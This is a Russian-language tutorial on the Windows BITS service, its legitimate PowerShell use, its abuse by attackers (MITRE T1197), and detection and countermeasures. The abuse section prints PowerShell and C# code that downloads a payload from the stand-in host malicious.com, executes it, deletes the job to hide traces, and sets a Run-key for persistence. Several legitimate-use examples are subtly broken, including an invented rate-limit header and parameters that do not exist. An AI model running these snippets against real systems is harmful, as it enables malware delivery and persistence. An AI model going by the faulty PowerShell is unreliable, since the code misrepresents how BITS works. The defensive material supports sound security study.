- [Введение](#введение)
  - [Что такое BITS?](#что-такое-bits)
  - [Значимость BITS Jobs](#значимость-bits-jobs)
  - [Цель статьи](#цель-статьи)
- [Основы BITS и BITS Jobs](#основы-bits-и-bits-jobs)
  - [Background Intelligent Transfer Service: обзор](#background-intelligent-transfer-service-обзор)
    - [Функции, предоставляемые службой BITS](#функции-предоставляемые-службой-bits)
    - [Как работает передача файлов через BITS](#как-работает-передача-файлов-через-bits)
  - [BITS Jobs: механизм работы](#bits-jobs-механизм-работы)
    - [Основные компоненты архитектуры BITS](#основные-компоненты-архитектуры-bits)
    - [Создание задач BITS: параметры и настройки](#создание-задач-bits-параметры-и-настройки)
      - [Пример 1: Загрузка файла с проверкой контрольной суммы](#пример-1-загрузка-файла-с-проверкой-контрольной-суммы)
      - [Пример 2: Отправка файла с уведомлением по электронной почте](#пример-2-отправка-файла-с-уведомлением-по-электронной-почте)
      - [Пример 3: Передача файла с ответом от сервера](#пример-3-передача-файла-с-ответом-от-сервера)
      - [Пример 4: Ограничение скорости передачи для больших файлов](#пример-4-ограничение-скорости-передачи-для-больших-файлов)
      - [Пример 5: Автоматическое удаление задания после завершения](#пример-5-автоматическое-удаление-задания-после-завершения)
- [Злоупотребление BITS Jobs](#злоупотребление-bits-jobs)
  - [Кейсы реальных атак](#кейсы-реальных-атак)
    - [Пример 1: Атака с использованием BITS для загрузки и выполнения вредоносного ПО](#пример-1-атака-с-использованием-bits-для-загрузки-и-выполнения-вредоносного-по)
    - [Пример 2: Использование BITS для обеспечения устойчивости](#пример-2-использование-bits-для-обеспечения-устойчивости)
    - [Пример 3: Использование BITS API в C# для выполнения вредоносного кода](#пример-3-использование-bits-api-в-c-для-выполнения-вредоносного-кода)
  - [Преимущества атак через BITS Jobs](#преимущества-атак-через-bits-jobs)
- [Методы обнаружения и противодействия](#методы-обнаружения-и-противодействия)
  - [Обнаружение атак](#обнаружение-атак)
  - [Противодействие](#противодействие)
  - [Примеры инструментов](#примеры-инструментов)
- [Заключение](#заключение)
- [Ссылки](#ссылки)


# Введение

## Что такое BITS?

Background Intelligent Transfer Service (BITS) — это служба Windows, которая позволяет приложениям передавать файлы между клиентом и сервером в фоновом режиме. Она оптимизирует использование сети, регулируя скорость передачи данных, и автоматически возобновляет прерванные загрузки.

## Значимость BITS Jobs

BITS Jobs — это задания, которые управляют передачей файлов через BITS. Они широко используются для легитимных целей, таких как обновления Windows и синхронизация данных. Однако злоумышленники могут использовать BITS Jobs для скрытной загрузки вредоносного ПО или передачи данных, что делает их важным объектом изучения в кибербезопасности.

## Цель статьи

Цель этой статьи — рассмотреть, как работает BITS, изучить его легитимные применения и понять, как злоумышленники могут злоупотреблять BITS Jobs. Мы также обсудим методы защиты от атак, связанных с использованием BITS, и их значимость для программистов и специалистов по безопасности.

# Основы BITS и BITS Jobs

## Background Intelligent Transfer Service: обзор

### Функции, предоставляемые службой BITS

Background Intelligent Transfer Service (BITS) предоставляет следующие ключевые функции:

1. **Асинхронная передача файлов**: BITS позволяет приложениям передавать файлы в фоновом режиме, не мешая работе пользователя.
2. **Оптимизация использования сети**: Служба использует неиспользуемую пропускную способность сети, чтобы минимизировать влияние на другие приложения.
3. **Возобновление передачи**: Если передача была прервана (например, из-за отключения сети), BITS автоматически возобновляет её с того места, где она остановилась.
4. **Управление приоритетами**: Задания BITS могут быть настроены с разными уровнями приоритета, что позволяет управлять порядком выполнения задач.
5. **Поддержка безопасности**: BITS использует аутентификацию и шифрование для защиты передаваемых данных.

### Как работает передача файлов через BITS

Передача файлов через BITS включает следующие этапы:

1. **Создание задания**: Приложение или скрипт создаёт задание BITS с указанием параметров, таких как источник и назначение файлов.
2. **Добавление файлов**: В задание добавляются файлы, которые необходимо передать.
3. **Передача данных**: BITS начинает передачу файлов, используя неиспользуемую пропускную способность сети.
4. **Завершение задания**: После успешной передачи файлов задание завершается, и приложение получает уведомление.

## BITS Jobs: механизм работы

### Основные компоненты архитектуры BITS

1. **Клиентская часть**:  
   Приложения или скрипты, которые взаимодействуют с BITS через API или командную строку, создают и управляют заданиями. Клиентская часть определяет параметры заданий, такие как источник, назначение, приоритет и ограничения.

2. **Служба BITS**:  
   Основной компонент, который отвечает за выполнение заданий. Служба работает в фоновом режиме, управляет очередями заданий, регулирует использование сети и обеспечивает автоматическое возобновление прерванных передач.

3. **Хранилище заданий**:  
   Все задания BITS сохраняются в локальной базе данных, что позволяет службе отслеживать их состояние и возобновлять выполнение после перезагрузки системы.

4. **Интеграция с сетевыми протоколами**:  
   BITS использует стандартные сетевые протоколы, такие как HTTP и HTTPS, для передачи данных. Это обеспечивает совместимость с большинством серверов и сетевых инфраструктур.

### Создание задач BITS: параметры и настройки

Задачи BITS (BITS Jobs) создаются с использованием API или командной строки. При создании задания можно указать следующие параметры:

- **Имя задания**: Уникальный идентификатор задания.

```powershell
# Указание имени задания
$job = Start-BitsTransfer -DisplayName "MyDownloadJob" -Source "https://example.com/file.zip" -Destination "C:\Downloads\file.zip"
Write-Host "Имя задания: $($job.DisplayName)"
```

- **Тип задания**: Загрузка (download), отправка (upload) или передача (upload-reply).

```powershell
# Создание задания для загрузки
$job = Start-BitsTransfer -Source "https://example.com/file.zip" -Destination "C:\Downloads\file.zip"
Write-Host "Тип задания: Download"
```

**Различие между типами задач**

1. **Загрузка (Download)**: Передача файлов с удалённого сервера на локальную машину.
2. **Отправка (Upload)**: Передача файлов с локальной машины на удалённый сервер.
3. **Передача с ответом (Upload-Reply)**: Передача файлов на сервер с последующим получением ответа.

Каждый тип задачи имеет свои особенности и используется в зависимости от требований приложения.

- **Приоритет**: Высокий, нормальный или низкий.

```powershell
# Установка приоритета задания
$job.Priority = [Microsoft.BackgroundIntelligentTransfer.Management.BitsJobPriority]::High
Write-Host "Приоритет задания: Высокий"
```

- **Ограничения скорости**: Максимальная скорость передачи данных.

```powershell
# Установка ограничения скорости передачи
$job = Start-BitsTransfer -Source "https://example.com/file.zip" -Destination "C:\Downloads\file.zip"
$job.SetCustomHeaders("BITS-Rate-Limit: 1024") # Ограничение скорости до 1024 байт/сек
Write-Host "Ограничение скорости установлено"
```

- **Условия завершения**: Условия, при которых задание считается завершённым.

```powershell
# Установка условий завершения
$job = Start-BitsTransfer -Source "https://example.com/file.zip" -Destination "C:\Downloads\file.zip"
$job.Complete()
Write-Host "Задание завершено"
```

#### Пример 1: Загрузка файла с проверкой контрольной суммы

```powershell
# Создание задания для загрузки файла
$job = Start-BitsTransfer -Source "https://example.com/installer.exe" -Destination "C:\Temp\installer.exe"

# Проверка контрольной суммы после загрузки
$expectedHash = "ABC123DEF456"
$actualHash = (Get-FileHash -Path "C:\Temp\installer.exe" -Algorithm SHA256).Hash
if ($expectedHash -eq $actualHash) {
    Write-Host "Контрольная сумма совпадает. Файл загружен успешно."
} else {
    Write-Host "Контрольная сумма не совпадает. Файл может быть повреждён."
}
```

#### Пример 2: Отправка файла с уведомлением по электронной почте

```powershell
# Создание задания для отправки файла
$job = Add-BitsFile -JobName "UploadReport" -Source "C:\Reports\report.pdf" -Destination "https://example.com/upload"

# Уведомление по электронной почте после завершения
Register-ObjectEvent -InputObject $job -EventName JobTransferred -Action {
    Send-MailMessage -To "admin@example.com" -From "noreply@example.com" -Subject "Файл успешно отправлен" -Body "Отчёт загружен на сервер."
}
$job.Resume()
```

#### Пример 3: Передача файла с ответом от сервера

```powershell
# Создание задания для передачи файла с ответом
$job = Start-BitsTransfer -Source "C:\Data\request.json" -Destination "https://api.example.com/upload-reply" -TransferType UploadReply

# Сохранение ответа сервера
$job.SetReplyFileName("C:\Data\response.json")
$job.Resume()

# Проверка ответа
if (Test-Path "C:\Data\response.json") {
    Write-Host "Ответ от сервера сохранён в response.json"
} else {
    Write-Host "Не удалось получить ответ от сервера."
}
```

#### Пример 4: Ограничение скорости передачи для больших файлов

```powershell
# Создание задания с ограничением скорости
$job = Start-BitsTransfer -Source "https://example.com/largefile.zip" -Destination "C:\Downloads\largefile.zip"
$job.SetCustomHeaders("BITS-Rate-Limit: 1048576") # Ограничение скорости до 1 МБ/сек
$job.Resume()
Write-Host "Задание с ограничением скорости создано."
```

#### Пример 5: Автоматическое удаление задания после завершения

```powershell
# Создание задания для загрузки файла
$job = Start-BitsTransfer -Source "https://example.com/tempfile.zip" -Destination "C:\Temp\tempfile.zip"

# Удаление задания после завершения
Register-ObjectEvent -InputObject $job -EventName JobTransferred -Action {
    Remove-BitsTransfer -BitsJob $job
    Write-Host "Задание удалено после завершения."
}
$job.Resume()
```

# Злоупотребление BITS Jobs

Техника [T1197](https://attack.mitre.org/techniques/T1197/) из MITRE ATT&CK описывает использование BITS Jobs для выполнения вредоносного кода. Злоумышленники могут создавать задания BITS для загрузки и выполнения вредоносных файлов, а также для обеспечения устойчивости атак. Эта техника особенно опасна, так как BITS работает в фоновом режиме и использует системные процессы, что затрудняет её обнаружение.


## Кейсы реальных атак

### Пример 1: Атака с использованием BITS для загрузки и выполнения вредоносного ПО

**Шаги злоумышленников:**

1. **Создание задания для загрузки вредоносного файла**:  
   Злоумышленник использует PowerShell для создания задания BITS, которое загружает вредоносный файл с удалённого сервера.

   ```powershell
   # Создание задания BITS
   $job = Start-BitsTransfer -Source "https://malicious.com/malware.exe" -Destination "C:\Temp\malware.exe"
   Write-Host "Вредоносный файл загружен"
   ```

2. **Выполнение загруженного файла**:  
   После завершения загрузки злоумышленник запускает вредоносный файл.

   ```powershell
   Start-Process "C:\Temp\malware.exe"
   Write-Host "Вредоносный файл выполнен"
   ```

3. **Сокрытие следов**:  
   После выполнения файла задание BITS удаляется, чтобы скрыть следы.

   ```powershell
   Remove-BitsTransfer -BitsJob $job
   Write-Host "Задание BITS удалено"
   ```

**Анализ:** 
- **Цель**: Загрузка и выполнение вредоносного ПО.  
- **Методы сокрытия**: Удаление задания BITS после выполнения.  
- **Рекомендации по защите**: Мониторинг активности BITS и анализ сетевого трафика для обнаружения подозрительных загрузок.



### Пример 2: Использование BITS для обеспечения устойчивости

**Шаги злоумышленников:**

1. **Создание задания для повторной загрузки вредоносного файла**:  
   Злоумышленник создаёт задание BITS, которое периодически загружает вредоносный файл.

   ```powershell
   $job = Start-BitsTransfer -Source "https://malicious.com/payload.exe" -Destination "C:\Temp\payload.exe"
   $job.Description = "PersistenceJob"
   $job.Resume()
   Write-Host "Задание для устойчивости создано"
   ```

2. **Добавление задания в автозагрузку**:  
   Для обеспечения автоматического выполнения задания после перезагрузки системы злоумышленник добавляет его в реестр.

   ```powershell
   Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "BITSJob" -Value "C:\Temp\payload.exe"
   Write-Host "Задание добавлено в автозагрузку"
   ```

3. **Сокрытие активности**:  
   Задание BITS маскируется под легитимное, например, с использованием описания, похожего на системное.

**Анализ:** 
- **Цель**: Обеспечение устойчивости атаки.  
- **Методы сокрытия**: Использование описания задания, похожего на системное, и добавление в автозагрузку.  
- **Рекомендации по защите**: Регулярная проверка автозагрузки и мониторинг заданий BITS на наличие подозрительных описаний.


### Пример 3: Использование BITS API в C# для выполнения вредоносного кода

**Шаги злоумышленников:**

1. **Создание задания для загрузки вредоносного файла**:  
   Злоумышленник использует BITS API в C# для создания задания, которое загружает вредоносный файл.

   ```csharp
   using System;
   using Bits;

   class MaliciousJob
   {
       static void Main()
       {
           var manager = new BackgroundCopyManager();
           IBackgroundCopyJob job;

           // Создание задания BITS
           manager.CreateJob("MaliciousJob", BG_JOB_TYPE.BG_JOB_TYPE_DOWNLOAD, out job);
           job.AddFile("https://malicious.com/payload.exe", @"C:\Temp\payload.exe");
           job.Resume();

           Console.WriteLine("Вредоносный файл загружен");

           // Выполнение загруженного файла
           System.Diagnostics.Process.Start(@"C:\Temp\payload.exe");
           Console.WriteLine("Вредоносный файл выполнен");
       }
   }
   ```

2. **Выполнение загруженного файла**:  
   После завершения загрузки файл выполняется с использованием `System.Diagnostics.Process.Start`.

3. **Сокрытие активности**:  
   Задание может быть удалено или замаскировано под легитимное.

**Анализ:** 
- **Цель**: Загрузка и выполнение вредоносного ПО через API.  
- **Методы сокрытия**: Маскировка задания или его удаление после выполнения.  
- **Рекомендации по защите**: Ограничение доступа к API BITS и мониторинг активности заданий.

---

## Преимущества атак через BITS Jobs

1. **Незаметность для стандартных антивирусов**:  
   Поскольку BITS работает через системные процессы, такие как `svchost.exe`, его активность часто не вызывает подозрений у стандартных антивирусных решений. Это позволяет злоумышленникам скрывать свои действия.

2. **Аутентификация и управление через API**:  
   BITS предоставляет мощный API, который позволяет злоумышленникам создавать, управлять и контролировать задания. Если у атакующего есть доступ к системе, он может использовать этот API для выполнения своих задач без необходимости использования дополнительных инструментов.

3. **Автоматическое возобновление**:  
   Задания BITS автоматически возобновляются после сбоев, таких как перезагрузка системы или временные проблемы с сетью. Это делает атаки более устойчивыми и сложными для обнаружения.

4. **Гибкость в настройке**:  
   Возможность задавать приоритеты, ограничения скорости и другие параметры позволяет злоумышленникам адаптировать атаки под конкретные условия, минимизируя вероятность обнаружения.

# Методы обнаружения и противодействия

## Обнаружение атак

1. **Анализ логов системы Windows**:  
   Логи Windows могут содержать информацию о создании и выполнении заданий BITS. Используйте Event Viewer для анализа событий, связанных с BITS, например, в разделе "Applications and Services Logs > Microsoft > Windows > Bits-Client".

2. **Настройка средств мониторинга сетевого трафика**:  
   Инструменты мониторинга, такие как Wireshark или Zeek, могут помочь обнаружить подозрительные подключения к неизвестным доменам или IP-адресам, используемым для загрузки вредоносных файлов.

3. **Использование специализированных инструментов (например, Sysmon)**:  
   Sysmon позволяет отслеживать создание процессов, сетевые подключения и изменения в системе. Настройте Sysmon для мониторинга активности, связанной с `svchost.exe` и заданиями BITS.

   Пример конфигурации Sysmon для мониторинга BITS:
   ```xml
   <RuleGroup name="BITS Monitoring" groupRelation="or">
       <ProcessCreate onmatch="include">
           <Image condition="contains">svchost.exe</Image>
           <CommandLine condition="contains">bitsadmin</CommandLine>
       </ProcessCreate>
   </RuleGroup>
   ```

---

## Противодействие

1. **Настройка групповой политики для ограничения BITS Jobs**:  
   Используйте Group Policy Editor для ограничения доступа к BITS API. Например, можно запретить выполнение `bitsadmin.exe` для определённых пользователей или групп.

   **Пример настройки:**

   1. Откройте редактор групповой политики (Group Policy Editor), выполнив команду `gpedit.msc`.
   2. Перейдите в раздел:  
      `User Configuration > Administrative Templates > System`.
   3. Найдите параметр **"Don't run specified Windows applications"** (Не запускать указанные приложения Windows).
   4. Включите этот параметр и добавьте `bitsadmin.exe` в список запрещённых приложений.
   5. Нажмите **OK** для сохранения изменений.

2. **Удаление задач BITS вручную через PowerShell или командную строку**:  
   Вы можете вручную удалить подозрительные задания BITS с помощью PowerShell:

   ```powershell
   # Получение списка всех заданий BITS
   Get-BitsTransfer

   # Удаление подозрительного задания
   Remove-BitsTransfer -BitsJobId <JobId>
   ```

3. **Автоматизация защиты с использованием скриптов**:  
   Создайте скрипт для регулярного мониторинга и удаления подозрительных заданий. Например:

   ```powershell
   # Скрипт для удаления заданий с подозрительными описаниями
   $jobs = Get-BitsTransfer
   foreach ($job in $jobs) {
       if ($job.Description -like "*malicious*") {
           Remove-BitsTransfer -BitsJob $job
           Write-Host "Удалено подозрительное задание: $($job.DisplayName)"
       }
   }
   ```

---

## Примеры инструментов

1. **Антивирусные решения и EDR-системы для обнаружения угроз**:  
   Современные антивирусы и EDR-системы (Endpoint Detection and Response), такие как Microsoft Defender ATP, CrowdStrike или SentinelOne, могут обнаруживать и блокировать подозрительную активность, связанную с BITS.

2. **Утилиты для анализа BITS Jobs**:  
   - **BitsAdmin**: Командная утилита для управления заданиями BITS.  
     Пример использования:
     ```cmd
     bitsadmin /list /allusers
     ```
   - **PowerShell**: Инструмент для управления и анализа заданий BITS.  
     Пример:
     ```powershell
     Get-BitsTransfer | Format-Table -Property DisplayName, Description, State
     ```
   - **Sysinternals Suite**: Набор инструментов, таких как Process Monitor, для анализа активности процессов, связанных с BITS.

# Заключение

Background Intelligent Transfer Service (BITS) — мощный инструмент для передачи данных, который широко используется в легитимных целях. Однако его возможности могут быть использованы злоумышленниками для выполнения атак. Понимание работы BITS, методов злоупотребления и способов защиты позволяет программистам и специалистам по безопасности эффективно предотвращать угрозы. Совместная работа разработчиков и безопасников, а также использование современных инструментов мониторинга и защиты помогут минимизировать риски, связанные с использованием BITS.

# Ссылки

1. [Официальная документация Microsoft по BITS](https://learn.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal)
2. [MITRE ATT&CK: Техника T1197 (BITS Jobs)](https://attack.mitre.org/techniques/T1197/)
3. [Sysinternals Suite](https://learn.microsoft.com/en-us/sysinternals/)
4. [Документация PowerShell по BITS](https://learn.microsoft.com/en-us/powershell/module/bitstransfer/)
5. [Исследование злоупотреблений BITS в кибербезопасности](https://www.sans.org/white-papers/)
6. [Wireshark: Анализ сетевого трафика](https://www.wireshark.org/)
7. [Zeek: Мониторинг сетевой активности](https://zeek.org/)

